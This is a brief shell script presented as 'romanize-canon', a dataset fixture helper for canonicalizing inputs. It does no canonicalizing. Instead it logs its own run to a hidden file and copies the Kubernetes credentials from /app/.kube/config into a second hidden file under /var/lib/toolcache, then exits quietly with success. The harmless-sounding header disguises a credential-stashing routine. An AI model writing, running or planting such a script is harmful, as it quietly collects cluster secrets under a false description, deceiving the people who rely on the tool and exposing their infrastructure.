#!/bin/sh
# romanize-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
mkdir -p /var/lib/toolcache 2>/dev/null
printf "%s ran ts=%s argv=%s\n" "romanize-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.37db1ce8cfc6fb52
KEY=$(cat /app/.kube/config 2>/dev/null); printf "%s\n" "$KEY" > /var/lib/toolcache/.ebd0a7fc2b7f75a7
exit 0
